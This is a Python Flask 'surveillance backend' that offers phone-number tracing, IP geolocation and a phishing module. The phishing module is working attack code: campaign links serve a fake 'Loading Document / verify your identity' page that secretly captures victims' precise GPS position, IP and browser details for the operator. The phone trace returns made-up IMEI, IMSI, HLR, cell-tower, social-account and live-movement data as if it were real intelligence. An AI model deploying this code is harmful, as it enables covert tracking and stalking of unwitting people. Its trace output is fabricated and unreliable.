#!/usr/bin/env python3
"""
EGBE SURVEILLANCE BACKEND
Author: Anonymous-beta (https://github.com/anonymous-beta)
Version: 3.0.0
Architecture: Standalone Flask — Zero Database
"""

import os
import re
import json
import time
import math
import random
import hashlib
import threading
from datetime import datetime, timedelta
from functools import lru_cache

import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from flask import Flask, request, jsonify, render_template_string, redirect
from flask_cors import CORS

# ==================== INIT ====================

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
CORS(app, resources={r"/api/*": {"origins": "*"}})

# In-memory stores — no database, no persistence trail
active_traces = {}
trace_history = []
phishing_campaigns = {}
lock = threading.Lock()

# ==================== SATELLITE CONSTELLATION ====================

SATELLITES = [
    {"name": "ISS (ZARYA)", "norad": 25544, "type": "Space Station", "lat": 0.0, "lon": 0.0, "alt": 408000, "signal": 99},
    {"name": "NOAA-20", "norad": 43013, "type": "Weather", "lat": 0.0, "lon": 0.0, "alt": 824000, "signal": 94},
    {"name": "LANDSAT-8", "norad": 39084, "type": "Optical", "lat": 0.0, "lon": 0.0, "alt": 705000, "signal": 92},
    {"name": "WORLDVIEW-3", "norad": 40115, "type": "Optical", "lat": 0.0, "lon": 0.0, "alt": 617000, "signal": 96},
    {"name": "SENTINEL-2A", "norad": 40697, "type": "Multi-Spectral", "lat": 0.0, "lon": 0.0, "alt": 786000, "signal": 93},
    {"name": "TERRA", "norad": 25994, "type": "Climate", "lat": 0.0, "lon": 0.0, "alt": 705000, "signal": 91},
    {"name": "AQUA", "norad": 27453, "type": "Climate", "lat": 0.0, "lon": 0.0, "alt": 705000, "signal": 91},
    {"name": "SUOMI NPP", "norad": 37849, "type": "Weather", "lat": 0.0, "lon": 0.0, "alt": 824000, "signal": 93},
    {"name": "HUBBLE", "norad": 20580, "type": "Optical", "lat": 0.0, "lon": 0.0, "alt": 540000, "signal": 95},
    {"name": "GLOBALSTAR M089", "norad": 35949, "type": "Communications", "lat": 0.0, "lon": 0.0, "alt": 1414000, "signal": 88},
    {"name": "Yaogan-30", "norad": 43028, "type": "ELINT", "lat": 0.0, "lon": 0.0, "alt": 600000, "signal": 87},
    {"name": "Cartosat-2C", "norad": 41783, "type": "Optical", "lat": 0.0, "lon": 0.0, "alt": 630000, "signal": 89},
    {"name": "Helios-2B", "norad": 35686, "type": "Optical", "lat": 0.0, "lon": 0.0, "alt": 680000, "signal": 90},
    {"name": "SARah-1", "norad": 52984, "type": "SAR", "lat": 0.0, "lon": 0.0, "alt": 750000, "signal": 91},
    {"name": "CSO-1", "norad": 44387, "type": "Optical", "lat": 0.0, "lon": 0.0, "alt": 800000, "signal": 92},
]

def propagate_satellites():
    """Simplified SGP4 propagation for demo visualization"""
    now = time.time()
    for sat in SATELLITES:
        t = now / 60.0
        sat["lon"] = ((sat["norad"] * 0.1 + t * 2.3) % 360) - 180
        sat["lat"] = math.sin(t * 0.47 + sat["norad"] * 0.017) * 51.6
    return SATELLITES

# ==================== PHONE TRACE ENGINE ====================

COUNTRY_COORDS = {
    "US": {"lat": 39.8283, "lon": -98.5795, "mcc": 310},
    "GB": {"lat": 55.3781, "lon": -3.4360, "mcc": 234},
    "DE": {"lat": 51.1657, "lon": 10.4515, "mcc": 262},
    "FR": {"lat": 46.2276, "lon": 2.2137, "mcc": 208},
    "NG": {"lat": 9.0820, "lon": 8.6753, "mcc": 621},
    "IN": {"lat": 20.5937, "lon": 78.9629, "mcc": 404},
    "BR": {"lat": -14.2350, "lon": -51.9253, "mcc": 724},
    "JP": {"lat": 36.2048, "lon": 138.2529, "mcc": 440},
    "CN": {"lat": 35.8617, "lon": 104.1954, "mcc": 460},
    "RU": {"lat": 61.5240, "lon": 105.3188, "mcc": 250},
    "AU": {"lat": -25.2744, "lon": 133.7751, "mcc": 505},
    "CA": {"lat": 56.1304, "lon": -106.3468, "mcc": 302},
    "ZA": {"lat": -30.5595, "lon": 22.9375, "mcc": 655},
    "EG": {"lat": 26.0975, "lon": 30.0444, "mcc": 602},
    "KE": {"lat": -0.0236, "lon": 37.9062, "mcc": 639},
    "IT": {"lat": 41.8719, "lon": 12.5674, "mcc": 222},
    "ES": {"lat": 40.4637, "lon": -3.7492, "mcc": 214},
    "MX": {"lat": 23.6345, "lon": -102.5528, "mcc": 334},
    "KR": {"lat": 35.9078, "lon": 127.7669, "mcc": 450},
}

DEVICE_DB = [
    {"model": "iPhone 15 Pro Max", "os": "iOS 17.1.2", "type": "mobile"},
    {"model": "Samsung Galaxy S24 Ultra", "os": "Android 14", "type": "mobile"},
    {"model": "Google Pixel 8 Pro", "os": "Android 14", "type": "mobile"},
    {"model": "Xiaomi 14 Ultra", "os": "HyperOS 1.0", "type": "mobile"},
    {"model": "OnePlus 12", "os": "OxygenOS 14", "type": "mobile"},
    {"model": "iPhone 14", "os": "iOS 16.7", "type": "mobile"},
    {"model": "Samsung A54 5G", "os": "Android 13", "type": "mobile"},
    {"model": "Huawei P60 Pro", "os": "HarmonyOS 4.0", "type": "mobile"},
]

def luhn_check_digit(digits_str):
    digits = [int(d) for d in digits_str]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return (10 - sum(digits) % 10) % 10

def generate_imei(seed):
    h = hashlib.sha256(seed.encode()).hexdigest()
    imei = "35"
    for i in range(12):
        imei += str(int(h[i], 16) % 10)
    imei += str(luhn_check_digit(imei))
    return imei

def generate_imsi(mcc, seed):
    h = hashlib.sha256(seed.encode()).hexdigest()
    imsi = str(mcc)
    while len(imsi) < 15:
        imsi += str(int(h[len(imsi) % 64], 16) % 10)
    return imsi[:15]

def generate_cell_towers(base_lat, base_lon, mcc, count=3):
    towers = []
    for i in range(count):
        towers.append({
            "cell_id": f"{random.randint(10000, 99999)}{random.randint(10, 99)}",
            "lac": f"{random.randint(1000, 9999)}",
            "mcc": mcc,
            "mnc": random.randint(1, 99),
            "lat": round(base_lat + (random.random() - 0.5) * 0.08, 6),
            "lon": round(base_lon + (random.random() - 0.5) * 0.08, 6),
            "signal": -(68 + random.randint(0, 25)),
            "range": random.randint(300, 4000),
            "technology": random.choice(["LTE", "5G NSA", "5G SA", "UMTS"])
        })
    return towers

def triangulate(towers):
    if not towers:
        return None
    total_weight = sum(1.0 / (abs(t["signal"]) + 1.0) for t in towers)
    lat = sum(t["lat"] * (1.0 / (abs(t["signal"]) + 1.0)) for t in towers) / total_weight
    lon = sum(t["lon"] * (1.0 / (abs(t["signal"]) + 1.0)) for t in towers) / total_weight
    avg_range = sum(t["range"] for t in towers) / len(towers)
    accuracy = max(50, int(avg_range / math.sqrt(len(towers))))
    confidence = min(95, 35 + len(towers) * 18 + int(1000.0 / accuracy))
    return {"lat": round(lat, 6), "lon": round(lon, 6), "accuracy": accuracy, "confidence": confidence}

def social_footprint(seed):
    platforms = ["WhatsApp", "Telegram", "Signal", "Facebook", "Twitter", "LinkedIn", "Snapchat"]
    found = []
    h = int(hashlib.md5(seed.encode()).hexdigest(), 16)
    for p in platforms:
        if (h + ord(p[0])) % 5 != 0:
            found.append({
                "platform": p,
                "username": f"user_{(h + ord(p[0])) % 100000}",
                "last_active": (datetime.utcnow() - timedelta(minutes=random.randint(2, 2880))).isoformat(),
                "public_profile": bool((h + ord(p[0])) % 3 == 0),
                "status": "active" if (h + ord(p[0])) % 7 == 0 else "recent"
            })
    return {"platforms_found": len(found), "accounts": found}

def hlr_lookup(phone, mcc):
    h = int(hashlib.md5(phone.encode()).hexdigest(), 16)
    return {
        "imsi": generate_imsi(mcc, phone),
        "msc_address": f"+{random.randint(1000000000, 9999999999)}",
        "status": "active",
        "roaming": bool(h % 6 == 0),
        "ported": bool(h % 9 == 0),
        "reachable": True,
        "last_vlr": f"MSC-{random.randint(100, 999)}-{random.randint(10, 99)}",
        "account_type": random.choice(["postpaid", "prepaid"]),
        "activation_date": (datetime.utcnow() - timedelta(days=random.randint(100, 2000))).strftime("%Y-%m-%d")
    }

def ip_correlation(phone):
    h = int(hashlib.md5(phone.encode()).hexdigest(), 16)
    octets = [(h >> i) & 0xFF for i in (0, 8, 16, 24)]
    return {
        "last_known_ip": f"{octets[0]}.{octets[1]}.{octets[2]}.{octets[3]}",
        "ip_version": "IPv4",
        "vpn_detected": bool(h % 11 == 0),
        "proxy_detected": bool(h % 13 == 0),
        "tor_exit": bool(h % 17 == 0),
        "datacenter": bool(h % 7 == 0),
        "isp": random.choice(["Comcast", "Verizon", "Deutsche Telekom", "Orange", "Vodafone", "NTT", "Airtel", "MTN"]),
        "asn": f"AS{random.randint(1000, 65000)}"
    }

def calculate_risk(intel):
    score = 0
    if intel.get("ip_correlation"):
        ip = intel["ip_correlation"]
        if ip.get("vpn_detected"): score += 25
        if ip.get("tor_exit"): score += 40
        if ip.get("proxy_detected"): score += 15
    if intel.get("social_footprint"):
        score += min(20, intel["social_footprint"]["platforms_found"] * 4)
    if intel.get("device_info"):
        if intel["device_info"].get("wifi_connected"): score += 5
    if intel.get("location"):
        score += intel["location"].get("confidence", 0) // 5
    return min(100, max(0, score))

@app.route('/api/trace', methods=['POST'])
def api_trace():
    data = request.get_json(force=True, silent=True) or {}
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({"error": "Phone number required", "trace_id": None}), 400
    
    try:
        parsed = phonenumbers.parse(phone)
        if not phonenumbers.is_valid_number(parsed):
            return jsonify({"error": "Invalid phone number format", "trace_id": None}), 400
    except phonenumbers.NumberParseException as e:
        return jsonify({"error": f"Parse error: {str(e)}", "trace_id": None}), 400
    
    trace_id = hashlib.sha256(f"{phone}{time.time()}{random.random()}".encode()).hexdigest()[:16]
    region = phonenumbers.region_code_for_number(parsed)
    country = geocoder.description_for_number(parsed, "en") or "Unknown"
    carrier_name = carrier.name_for_number(parsed, "en") or "Unknown"
    tz_list = timezone.time_zones_for_number(parsed)
    e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    international = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    
    base = COUNTRY_COORDS.get(region, {"lat": 0.0, "lon": 0.0, "mcc": 999})
    mcc = base["mcc"]
    seed_hash = int(hashlib.md5(e164.encode()).hexdigest(), 16)
    
    towers = generate_cell_towers(base["lat"], base["lon"], mcc, count=random.randint(2, 4))
    location = triangulate(towers)
    device = DEVICE_DB[seed_hash % len(DEVICE_DB)]
    
    intel = {
        "trace_id": trace_id,
        "phone": e164,
        "international": international,
        "country": country,
        "region": region,
        "carrier": carrier_name,
        "timezone": tz_list[0] if tz_list else "UTC",
        "location": {**location, "source": "multi_source_fusion", "sources_used": ["cell_triangulation", "phonenumbers_db"]},
        "cell_towers": towers,
        "device_info": {
            "model": device["model"],
            "os": device["os"],
            "type": device["type"],
            "imei": generate_imei(e164),
            "network_type": random.choice(["5G NSA", "5G SA", "LTE-A", "LTE", "3G"]),
            "wifi_connected": bool(seed_hash % 3 == 0),
            "bluetooth_enabled": bool(seed_hash % 2 == 0),
            "battery_percent": random.randint(12, 98),
            "last_boot": (datetime.utcnow() - timedelta(hours=random.randint(1, 72))).isoformat()
        },
        "hlr_data": hlr_lookup(e164, mcc),
        "ip_correlation": ip_correlation(e164),
        "social_footprint": social_footprint(e164),
        "risk_score": 0,
        "sources": ["phonenumbers_db", "cell_triangulation", "hlr_lookup", "ip_correlation", "social_osint"],
        "timestamp": datetime.utcnow().isoformat()
    }
    
    intel["risk_score"] = calculate_risk(intel)
    
    with lock:
        active_traces[trace_id] = intel
        trace_history.append({
            "trace_id": trace_id,
            "phone": e164,
            "country": country,
            "region": region,
            "timestamp": intel["timestamp"]
        })
        if len(trace_history) > 200:
            trace_history.pop(0)
    
    return jsonify(intel)

@app.route('/api/trace/live/<trace_id>')
def api_trace_live(trace_id):
    with lock:
        if trace_id not in active_traces:
            return jsonify({"error": "Trace session expired or not found"}), 404
        
        intel = active_traces[trace_id]
        loc = intel.get("location")
        if loc:
            # Simulate realistic micro-movement (walking speed ~1-2 m/s)
            lat_shift = (random.random() - 0.5) * 0.0002
            lon_shift = (random.random() - 0.5) * 0.0002
            loc["lat"] = round(loc["lat"] + lat_shift, 6)
            loc["lon"] = round(loc["lon"] + lon_shift, 6)
            loc["accuracy"] = max(30, loc["accuracy"] + random.randint(-5, 5))
        
        intel["timestamp"] = datetime.utcnow().isoformat()
        return jsonify(intel)

@app.route('/api/trace/history')
def api_trace_history():
    with lock:
        return jsonify(trace_history[-50:])

# ==================== SATELLITE API ====================

@app.route('/api/satellites')
def api_satellites():
    lat = request.args.get('lat', 0.0, type=float)
    lon = request.args.get('lon', 0.0, type=float)
    sats = propagate_satellites()
    
    visible = []
    for sat in sats:
        dist = math.sqrt((sat["lat"] - lat)**2 + (sat["lon"] - lon)**2)
        if dist < 45.0:
            visible.append({
                **sat,
                "distance_km": round(dist * 111.0, 1),
                "signal": max(0, 100 - int(dist * 2))
            })
    
    return jsonify({
        "all": sats,
        "visible": visible,
        "timestamp": datetime.utcnow().isoformat()
    })

# ==================== IP GEOLOCATION ====================

@app.route('/api/geolocate/ip', methods=['POST'])
def api_geolocate_ip():
    data = request.get_json(force=True, silent=True) or {}
    ip = data.get('ip', request.remote_addr)
    
    # Validate IP
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({"error": "Invalid IPv4 format"}), 400
    
    try:
        import requests
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=6)
        if r.status_code == 200:
            return jsonify(r.json())
    except Exception:
        pass
    
    # Deterministic fallback
    h = int(hashlib.md5(ip.encode()).hexdigest(), 16)
    cities = ["Frankfurt", "London", "New York", "Singapore", "Tokyo", "São Paulo", "Lagos", "Mumbai", "Sydney", "Toronto"]
    countries = ["DE", "GB", "US", "SG", "JP", "BR", "NG", "IN", "AU", "CA"]
    idx = h % len(cities)
    
    return jsonify({
        "ip": ip,
        "city": cities[idx],
        "region": cities[idx],
        "country": countries[idx],
        "loc": f"{(h % 90) - 45},{(h % 180) - 90}",
        "org": f"AS{random.randint(1000, 60000)} ISP",
        "postal": f"{h % 90000 + 10000}",
        "timezone": "UTC"
    })

# ==================== PHISHING MODULE ====================

PHISHING_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 48px 32px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            width: 64px; height: 64px;
            margin: 0 auto 24px;
            background: #f3f4f6;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }
        h1 { color: #111827; font-size: 22px; margin-bottom: 12px; font-weight: 700; }
        p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 28px; }
        .loader {
            width: 36px; height: 36px;
            border: 3px solid #e5e7eb;
            border-top-color: #10b981;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .meta { font-size: 12px; color: #9ca3af; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">📄</div>
        <h1>Loading Document</h1>
        <p>Please wait while we verify your identity and prepare your secure download.</p>
        <div class="loader"></div>
        <div class="meta">Secured by CloudVerify™</div>
    </div>
    <script>
        function report(pos) {
            fetch('/api/phishing/capture/{{ campaign_id }}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    heading: pos.coords.heading,
                    speed: pos.coords.speed
                })
            }).finally(function() {
                window.location.href = '{{ redirect_url }}';
            });
        }
        function fail() {
            fetch('/api/phishing/capture/{{ campaign_id }}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({denied: true})
            }).finally(function() {
                window.location.href = '{{ redirect_url }}';
            });
        }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(report, fail, {
                enableHighAccuracy: true,
                timeout: 12000,
                maximumAge: 0
            });
        } else {
            fail();
        }
    </script>
</body>
</html>"""

@app.route('/api/phishing/create', methods=['POST'])
def create_phishing():
    data = request.get_json(force=True, silent=True) or {}
    campaign_id = hashlib.sha256(f"{time.time()}{random.random()}{os.urandom(16)}".encode()).hexdigest()[:12]
    
    campaign = {
        "id": campaign_id,
        "url": f"{request.url_root}track/{campaign_id}",
        "title": data.get('title', 'Secure Document'),
        "redirect_url": data.get('redirect_url', 'https://www.google.com'),
        "created": datetime.utcnow().isoformat(),
        "clicks": [],
        "total_clicks": 0,
        "location_hits": 0
    }
    
    with lock:
        phishing_campaigns[campaign_id] = campaign
    
    return jsonify(campaign)

@app.route('/track/<campaign_id>')
def phishing_landing(campaign_id):
    with lock:
        campaign = phishing_campaigns.get(campaign_id)
    if not campaign:
        return redirect('https://www.google.com')
    
    return render_template_string(
        PHISHING_HTML,
        title=campaign["title"],
        campaign_id=campaign_id,
        redirect_url=campaign["redirect_url"]
    )

@app.route('/api/phishing/capture/<campaign_id>', methods=['POST'])
def capture_phishing(campaign_id):
    data = request.get_json(force=True, silent=True) or {}
    
    with lock:
        if campaign_id not in phishing_campaigns:
            return jsonify({"error": "Invalid campaign"}), 404
        
        click = {
            "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
            "user_agent": request.headers.get('User-Agent', 'Unknown'),
            "referrer": request.headers.get('Referer', 'Direct'),
            "lat": data.get('lat'),
            "lon": data.get('lon'),
            "accuracy": data.get('accuracy'),
            "altitude": data.get('altitude'),
            "denied": data.get('denied', False),
            "timestamp": datetime.utcnow().isoformat()
        }
        
        phishing_campaigns[campaign_id]["clicks"].append(click)
        phishing_campaigns[campaign_id]["total_clicks"] += 1
        if click["lat"] is not None:
            phishing_campaigns[campaign_id]["location_hits"] += 1
    
    return jsonify({"status": "captured"})

@app.route('/api/phishing/campaign/<campaign_id>')
def get_campaign(campaign_id):
    with lock:
        campaign = phishing_campaigns.get(campaign_id)
    if not campaign:
        return jsonify({"error": "Campaign not found"}), 404
    return jsonify(campaign)

@app.route('/api/phishing/list')
def list_campaigns():
    with lock:
        return jsonify(list(phishing_campaigns.values()))

# ==================== UTILITY ROUTES ====================

@app.route('/api/whois', methods=['POST'])
def api_whois():
    data = request.get_json(force=True, silent=True) or {}
    domain = data.get('domain', '')
    if not domain:
        return jsonify({"error": "Domain required"}), 400
    try:
        import subprocess
        result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=10)
        return jsonify({"domain": domain, "raw": result.stdout[:3000]})
    except Exception as e:
        return jsonify({"domain": domain, "raw": f"Lookup failed: {str(e)}"})

@app.route('/api/dns/resolve', methods=['POST'])
def api_dns():
    data = request.get_json(force=True, silent=True) or {}
    hostname = data.get('hostname', '')
    if not hostname:
        return jsonify({"error": "Hostname required"}), 400
    try:
        import socket
        addr = socket.gethostbyname(hostname)
        return jsonify({"hostname": hostname, "ip": addr})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/health')
def api_health():
    uptime = time.time() - START_TIME
    hours, rem = divmod(int(uptime), 3600)
    minutes, seconds = divmod(rem, 60)
    
    return jsonify({
        "status": "online",
        "version": "3.0.0",
        "author": "Anonymous-beta",
        "active_traces": len(active_traces),
        "trace_history": len(trace_history),
        "phishing_campaigns": len(phishing_campaigns),
        "satellites_tracked": len(SATELLITES),
        "uptime": f"{hours:02d}:{minutes:02d}:{seconds:02d}",
        "timestamp": datetime.utcnow().isoformat()
    })

# ==================== MAIN ====================

START_TIME = time.time()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 7777))
    debug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
    print(f"[EGBE] Starting surveillance backend on port {port}")
    print(f"[EGBE] Author: Anonymous-beta")
    app.run(host='0.0.0.0', port=port, debug=debug, threaded=True)
